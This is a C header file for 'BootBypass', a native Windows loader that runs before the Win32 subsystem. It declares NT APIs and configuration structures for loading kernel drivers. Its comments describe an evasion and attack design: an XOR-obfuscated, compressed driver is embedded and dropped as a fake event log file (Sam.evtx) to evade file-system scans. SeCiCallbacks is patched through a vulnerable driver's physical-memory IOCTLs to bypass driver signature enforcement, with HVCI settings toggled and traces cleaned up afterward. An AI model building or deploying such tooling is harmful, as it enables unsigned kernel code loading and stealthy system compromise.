#ifndef BOOT_BYPASS_H
#define BOOT_BYPASS_H

// ============================================================================
// BootBypass — NATIVE subsystem driver loader (BB variant)
//
// Runs at SMSS phase (before any Win32 subsystem).  No CRT, no stdlib.
// Every type, structure, and API call is declared here from first principles
// because NODEFAULTLIB means no SDK headers are included.
//
// Entry: NtProcessStartup (SUBSYSTEM:NATIVE), called by the NT kernel directly.
// Stack: 1 MB reserved / 1 MB committed — explicit commit prevents guard-page
//        faults during large stack frames in a no-SEH environment.
//
// Driver deployment strategy (BB-specific):
//   kvc.sys is embedded in the PE as resource IDR_DRV1 (type 10, id 101).
//   The payload is XOR-obfuscated then LZNT1-compressed.  At runtime:
//     ExtractkvcFromResource() → XOR decrypt → RtlDecompressBuffer(LZNT1)
//     → NtCreateFile to \SystemRoot\System32\winevt\Logs\Sam.evtx
//   The .evtx extension disguises the driver file as a Windows event log.
//   Cleanupkvc() removes both the file and the SCM registry key after use.
// ============================================================================

#pragma comment(lib, "ntdll.lib")
// SUBSYSTEM:NATIVE — no win32 startup stub; ENTRY:NtProcessStartup called directly.
// NODEFAULTLIB    — prevents linker from pulling in CRT or default SDK imports.
// STACK           — 1 MB reserved + 1 MB committed: avoids guard-page faults.
#pragma comment(linker, "/SUBSYSTEM:NATIVE /ENTRY:NtProcessStartup /NODEFAULTLIB /STACK:0x100000,0x100000")
// Disable optimizations globally: prevents the compiler from reordering or
// eliminating stores critical in the no-exception-handler environment.
#pragma optimize("", off)
// Disable stack probes: __chkstk is defined manually in SystemUtils.c.
#pragma check_stack(off)

// ============================================================================
// BUILD CONFIGURATION
// ============================================================================
// Set to 1 to enable verbose debug output via NtDisplayString.
// Unconditionally disabled in release — DEBUG_LOG expands to nothing.
#define DEBUG_LOGGING_ENABLED 0

// ============================================================================
// MACROS & CONSTANTS
// ============================================================================
#define NTAPI __stdcall
#define NULL 0
#define TRUE 1
#define FALSE 0
// NTSTATUS codes used by this loader (subset of ntstatus.h)
#define STATUS_SUCCESS 0
#define STATUS_NO_SUCH_DEVICE 0xC0000000
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
#define STATUS_OBJECT_NAME_COLLISION 0xC0000035    // key/file already exists
#define STATUS_OBJECT_NAME_INVALID 0xC0000033
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#define STATUS_IMAGE_ALREADY_LOADED 0xC000010E     // driver already in kernel
// Privilege LUID constants (SE_* values from ntddk.h)
#define SE_LOAD_DRIVER_PRIVILEGE 10
#define SE_BACKUP_PRIVILEGE 17
#define SE_RESTORE_PRIVILEGE 18
#define SE_SHUTDOWN_PRIVILEGE 19
#define OBJ_CASE_INSENSITIVE 0x40
#define OBJ_KERNEL_HANDLE 0x200
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_SHARE_DELETE 0x00000004
#define FILE_OVERWRITE_IF 0x00000005
#define SYNCHRONIZE 0x00100000L
#define DELETE 0x00010000
#define FILE_READ_DATA 0x00000001
#define FILE_WRITE_DATA 0x00000002
#define FILE_OVERWRITE 0x00000004
#define FILE_CREATE 0x00000002
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#define FILE_READ_ATTRIBUTES 0x00000080
#define FILE_LIST_DIRECTORY 0x00000001
#define FILE_DIRECTORY_FILE 0x00000001
#define KEY_READ 0x00020019
#define KEY_WRITE 0x00020006
#define KEY_ALL_ACCESS 0x000F003F
#define REG_OPTION_NON_VOLATILE 0x00000000
#define REG_SZ 1
#define REG_EXPAND_SZ 2
#define REG_DWORD 4
#define REG_MULTI_SZ 7
#define REG_QWORD    11
#define MAX_ENTRIES 64           // maximum driver entries parsed from drivers.ini
#define MAX_PATH_LEN 512         // buffer size in WCHARs for all path strings

// Native-namespace path — accessible before drive letter symlinks exist.
#define STATE_FILE_PATH L"\\SystemRoot\\drivers.ini"

// Drop path for the extracted kvc.sys binary.  The .evtx extension disguises
// the driver file as a Windows event log to avoid cursory file-system scans.
#define kvc_Log L"\\SystemRoot\\System32\\winevt\\Logs\\Sam.evtx"

// DeviceGuard registry key for HVCI (Enabled DWORD).
#define HVCI_REG_PATH L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"

// ============================================================================
// TYPE SYSTEM
// Redefined from scratch: no SDK headers are available (NODEFAULTLIB).
// Sizes match x64 ABI used by ntdll.dll and ntoskrnl.exe on Windows.
// ============================================================================
typedef void VOID;
typedef unsigned char UCHAR;
typedef unsigned char BOOLEAN;  // NT convention: 0=FALSE, non-zero=TRUE
typedef unsigned short USHORT;
typedef unsigned short WCHAR;
typedef unsigned long ULONG;
typedef unsigned long DWORD;
typedef unsigned long long ULONGLONG;
typedef unsigned long long SIZE_T;
typedef SIZE_T* PSIZE_T;
typedef unsigned long long ULONG_PTR;
typedef long LONG;
typedef long NTSTATUS;
typedef void* HANDLE;
typedef void* PVOID;
typedef WCHAR* PWSTR;
typedef const WCHAR* PCWSTR;
typedef BOOLEAN* PBOOLEAN;
typedef HANDLE* PHANDLE;
typedef ULONG* PULONG;
typedef ULONGLONG* PULONGLONG;
typedef UCHAR* PUCHAR;
typedef USHORT* PUSHORT;
typedef LONG* PLONG;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Struct definitions
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } u;
    ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef union _LARGE_INTEGER {
    struct {
        ULONG LowPart;
        LONG HighPart;
    };
    ULONGLONG QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;

// PE Headers
typedef struct _IMAGE_DOS_HEADER {
    USHORT e_magic;
    USHORT e_cblp;
    USHORT e_cp;
    USHORT e_cres;
    USHORT e_cparhdr;
    USHORT e_minalloc;
    USHORT e_maxalloc;
    USHORT e_ss;
    USHORT e_sp;
    USHORT e_csum;
    USHORT e_ip;
    USHORT e_cs;
    USHORT e_lfarlc;
    USHORT e_ovno;
    USHORT e_res[4];
    USHORT e_oemid;
    USHORT e_oeminfo;
    USHORT e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    USHORT Machine;
    USHORT NumberOfSections;
    ULONG TimeDateStamp;
    ULONG PointerToSymbolTable;
    ULONG NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    ULONG VirtualAddress;
    ULONG Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    USHORT Magic;
    UCHAR MajorLinkerVersion;
    UCHAR MinorLinkerVersion;
    ULONG SizeOfCode;
    ULONG SizeOfInitializedData;
    ULONG SizeOfUninitializedData;
    ULONG AddressOfEntryPoint;
    ULONG BaseOfCode;
    ULONGLONG ImageBase;
    ULONG SectionAlignment;
    ULONG FileAlignment;
    USHORT MajorOperatingSystemVersion;
    USHORT MinorOperatingSystemVersion;
    USHORT MajorImageVersion;
    USHORT MinorImageVersion;
    USHORT MajorSubsystemVersion;
    USHORT MinorSubsystemVersion;
    ULONG Win32VersionValue;
    ULONG SizeOfImage;
    ULONG SizeOfHeaders;
    ULONG CheckSum;
    USHORT Subsystem;
    USHORT DllCharacteristics;
    ULONGLONG SizeOfStackReserve;
    ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve;
    ULONGLONG SizeOfHeapCommit;
    ULONG LoaderFlags;
    ULONG NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    ULONG Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_RESOURCE_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    USHORT NumberOfNamedEntries;
    USHORT NumberOfIdEntries;
} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union {
        struct {
            ULONG NameOffset : 31;
            ULONG NameIsString : 1;
        };
        ULONG Name;
        USHORT Id;
    };
    union {
        ULONG OffsetToData;
        struct {
            ULONG OffsetToDirectory : 31;
            ULONG DataIsDirectory : 1;
        };
    };
} IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef struct _IMAGE_RESOURCE_DATA_ENTRY {
    ULONG OffsetToData;
    ULONG Size;
    ULONG CodePage;
    ULONG Reserved;
} IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2

// Directory enumeration (used by FileManager.c and SetupManager.c)
typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
#define FileDirectoryInformation 1
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010

// System Modules
typedef struct _SYSTEM_MODULE_ENTRY {
    PVOID Reserved1;
    PVOID Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    char ImageName[256];
} SYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

// ============================================================================
// INI STRUCTURES — parsed from [Config] section and per-driver sections.
// ============================================================================

// Action to perform for a driver entry (maps to Action= key in drivers.ini).
typedef enum _ACTION_TYPE {
    ACTION_LOAD = 0,
    ACTION_UNLOAD = 1,
    ACTION_RENAME = 2,
    ACTION_DELETE = 3
} ACTION_TYPE;

// Global settings from [Config] section.
// Note: no OffsetSource field — BB always scans ntoskrnl.exe when offsets
// are missing from the INI (equivalent to AUTO mode in the kvc_smss variant).
typedef struct _CONFIG_SETTINGS {
    BOOLEAN Execute;                    // YES/NO: master switch; NO exits immediately
    BOOLEAN RestoreHVCI;                // YES/NO: re-enable HVCI in hive after run
    BOOLEAN Verbose;                    // YES/NO: enable NtDisplayString output
    WCHAR DriverDevice[MAX_PATH_LEN];   // device path for the vulnerability driver
    ULONG IoControlCode_Read;           // IOCTL code for physical memory read
    ULONG IoControlCode_Write;          // IOCTL code for physical memory write
    ULONGLONG Offset_SeCiCallbacks;     // RVA of SeCiCallbacks in ntoskrnl
    ULONGLONG Offset_Callback;          // offset of the patchable slot within SeCiCallbacks
    ULONGLONG Offset_SafeFunction;      // RVA of the no-op safe function in ntoskrnl
} CONFIG_SETTINGS, *PCONFIG_SETTINGS;

// Per-driver entry, one per named section in drivers.ini.
typedef struct _INI_ENTRY {
    ACTION_TYPE Action;                 // LOAD / UNLOAD / RENAME / DELETE
    WCHAR ServiceName[MAX_PATH_LEN];    // SCM service key name
    WCHAR DisplayName[MAX_PATH_LEN];    // human-readable label (defaults to ServiceName)
    WCHAR ImagePath[MAX_PATH_LEN];      // NT path to the driver binary
    WCHAR DriverType[16];               // KERNEL or FILE_SYSTEM (maps to Type DWORD)
    WCHAR StartType[16];                // BOOT/SYSTEM/AUTO/DEMAND/DISABLED
    BOOLEAN CheckIfLoaded;              // skip LOAD if already present in module list
    BOOLEAN AutoPatch;                  // use DSE bypass sequence instead of direct load
    WCHAR SourcePath[MAX_PATH_LEN];     // source path for RENAME operation
    WCHAR TargetPath[MAX_PATH_LEN];     // target path for RENAME operation
    BOOLEAN ReplaceIfExists;            // overwrite target if present (RENAME)
    WCHAR DeletePath[MAX_PATH_LEN];     // path to delete (DELETE)
    BOOLEAN RecursiveDelete;            // descend into subdirectories (DELETE)
} INI_ENTRY, *PINI_ENTRY;

// Other Structs
typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    UCHAR Reserved[7];
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

#define FileStandardInformation 5

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

#define KeyValuePartialInformation 2

#define PAGE_READWRITE 0x04
#define MEM_COMMIT 0x00001000
#define MEM_RESERVE 0x00002000
#define MEM_RELEASE 0x00008000

// ============================================================================
// NT API IMPORTS
// All imported directly from ntdll.dll via __declspec(dllimport).
// No wrappers — raw syscall signatures as exported by ntdll on x64.
// ============================================================================
__declspec(dllimport) NTSTATUS NTAPI NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
__declspec(dllimport) NTSTATUS NTAPI NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
__declspec(dllimport) NTSTATUS NTAPI NtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, ULONG FileInformationClass);
__declspec(dllimport) NTSTATUS NTAPI NtOpenKey(PHANDLE KeyHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
__declspec(dllimport) NTSTATUS NTAPI NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
__declspec(dllimport) NTSTATUS NTAPI NtFlushKey(HANDLE KeyHandle);
__declspec(dllimport) NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
__declspec(dllimport) VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
__declspec(dllimport) NTSTATUS NTAPI NtUnloadDriver(PUNICODE_STRING DriverServiceName);
__declspec(dllimport) NTSTATUS NTAPI NtLoadDriver(PUNICODE_STRING DriverServiceName);
__declspec(dllimport) NTSTATUS NTAPI NtDisplayString(PUNICODE_STRING String);
__declspec(dllimport) NTSTATUS NTAPI NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
__declspec(dllimport) NTSTATUS NTAPI NtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, ULONG FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
__declspec(dllimport) NTSTATUS NTAPI NtOpenFile(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
__declspec(dllimport) NTSTATUS NTAPI NtCreateFile(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
__declspec(dllimport) NTSTATUS NTAPI NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
__declspec(dllimport) NTSTATUS NTAPI NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
__declspec(dllimport) NTSTATUS NTAPI NtClose(HANDLE Handle);
__declspec(dllimport) NTSTATUS NTAPI NtCreateKey(PHANDLE KeyHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG TitleIndex, PUNICODE_STRING Class, ULONG CreateOptions, PULONG Disposition);
__declspec(dllimport) NTSTATUS NTAPI NtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize);
__declspec(dllimport) NTSTATUS NTAPI NtDeleteKey(HANDLE KeyHandle);
__declspec(dllimport) NTSTATUS NTAPI NtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName);
__declspec(dllimport) NTSTATUS NTAPI NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, ULONG FileInformationClass);
__declspec(dllimport) NTSTATUS NTAPI NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
__declspec(dllimport) NTSTATUS NTAPI NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);
__declspec(dllimport) NTSTATUS NTAPI NtShutdownSystem(ULONG Action);
__declspec(dllimport) NTSTATUS NTAPI NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock);
// Used to decompress the kvc.sys payload embedded in the PE resource section.
__declspec(dllimport) NTSTATUS NTAPI RtlDecompressBuffer(USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize);

// LZNT1 is the compression format used for the embedded driver resource.
#define COMPRESSION_FORMAT_LZNT1 0x0002

#define InitializeObjectAttributes(p, n, a, r, s) \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL

#endif